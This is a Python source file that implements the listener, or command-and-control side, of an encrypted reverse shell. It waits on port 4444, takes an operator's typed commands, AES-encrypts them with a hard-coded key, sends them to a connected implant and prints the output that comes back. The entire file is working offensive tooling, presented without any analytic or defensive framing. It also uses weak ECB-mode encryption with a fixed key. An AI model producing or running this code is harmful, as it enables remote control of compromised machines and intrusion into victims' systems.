import socket
import threading
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA1
import subprocess

SECRET_KEY = "s3cr3tK3y1234567"
HOST = '0.0.0.0'
PORT = 4444

def pad(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    return data[:-data[-1]]

def gen_key(secret):
    sha1 = SHA1.new()
    sha1.update(secret.encode('utf-8'))
    key = sha1.digest()[:16]
    return key

def encrypt(msg):
    key = gen_key(SECRET_KEY)
    cipher = AES.new(key, AES.MODE_ECB)
    padded = pad(msg.encode('utf-8'))
    enc = cipher.encrypt(padded)
    return base64.b64encode(enc).decode()

def decrypt(enc):
    key = gen_key(SECRET_KEY)
    cipher = AES.new(key, AES.MODE_ECB)
    decoded = base64.b64decode(enc)
    decrypted = cipher.decrypt(decoded)
    return unpad(decrypted).decode()

def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}")

    try:
        data = conn.recv(4096).decode()
        print("[Client] " + decrypt(data))

        while True:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            enc_cmd = encrypt(cmd)
            conn.sendall((enc_cmd + "\n").encode())

            resp = conn.recv(16384).decode()
            try:
                output = decrypt(resp)
            except Exception as e:
                output = f"[!] Failed to decrypt: {e}"
            print(output)

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        conn.close()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")
        while True:
            conn, addr = s.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()

if __name__ == "__main__":
    main()
